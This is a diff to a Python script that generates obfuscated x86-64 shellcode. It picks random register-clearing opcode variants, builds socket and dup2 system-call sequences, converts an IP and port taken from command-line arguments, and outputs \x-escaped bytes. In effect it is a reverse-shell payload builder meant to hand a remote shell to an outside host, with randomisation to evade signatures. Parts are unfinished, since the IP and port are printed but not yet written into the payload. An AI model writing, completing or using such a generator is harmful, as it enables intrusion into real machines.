@@ -74,7 +74,7 @@ def offus(string4Payload, rand):
 
 def clean(reg):
     if str(reg) == "rax":
-        l = ["4831C0", "4829c0", "48c1e810"]
+        l = ["4831c0", "4829c0", "48c1e810"]
         return l[r(0,2)]
     elif str(reg) == "rbx":
         l = ["4831db","4829db", "48c1eb10"]
@@ -85,13 +85,23 @@ def clean(reg):
     elif str(reg) == "rdx":
         l = ["4831d2","4829d2", "48c1ea10"]
         return l[r(0,2)]
+    elif str(reg) == "rsi":
+        l = ["4831f6", "48c1ee10", "4829f6"]
+        return l[r(0,2)]
+    elif str(reg) == "rdi":
+        l = ["4831ff","48c1ef10","4829ff"]
+        return l[r(0,2)]
 
 
-def ip_to_opcode(ip):
+def ip_to_opcode(ip, port):
     ip_array = ip.split('.')
     pi = ip_array[3] +'.'+ip_array[2]+'.'+ip_array[1]+'.'+ip_array[0]
     hexpi = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, pi.split('.')))
+    port_length = len(port)
+    print(port_length)
+    ropt = hex(socket.htons(int(port)))
     print(hexpi)
+    print(ropt)
 
 
 def create_socket():
@@ -127,9 +137,12 @@ def create_socket():
 
 def dup2x3():
     global PAYLOAD
+    PAYLOAD += clean('rax')
     for i in range(0,2):
         PAYLOAD += "b03f"
+        PAYLOAD += "4c89d7"
         PAYLOAD += call()
+        PAYLOAD += clean('rsi')
 
 
 
@@ -146,6 +159,7 @@ def _exit():
     PAYLOAD+=clean("rax")
     PAYLOAD+=clean("rdx")
     PAYLOAD+="b03c"
+    PAYLOAD +='4c89d7'
    # print(PAYLOAD)
     PAYLOAD += call()
 
@@ -156,20 +170,27 @@ def call():
 
 def bit_to_opcode(payload):
     byte = ""
-#    for x in range(0, len(payload)-2, 2):
     return byte
 
-
+def shellcodize(PAYLOAD):
+    shellcode = 'X'
+    shellcode += 'X'.join(a+b for a,b in zip(PAYLOAD[::2], PAYLOAD[1::2]))
+    shellcode = shellcode.replace('X', '\\x')
+    return(shellcode)
 
 PAYLOAD = ""
 PAYLOAD += clean("rax")
 PAYLOAD += clean("rbx")
 PAYLOAD += clean("rcx")
 PAYLOAD += clean("rdx")
+PAYLOAD += clean("rdi")
+PAYLOAD += clean("rsi")
 create_socket()
+ip_to_opcode(argv[1], argv[2])
 dup2x3()
 #print(PAYLOAD)
 _exit()
-ip_to_opcode(argv[1])
+
 #print(bit_to_opcode(PAYLOAD))
 print(PAYLOAD)
+print(shellcodize(PAYLOAD))
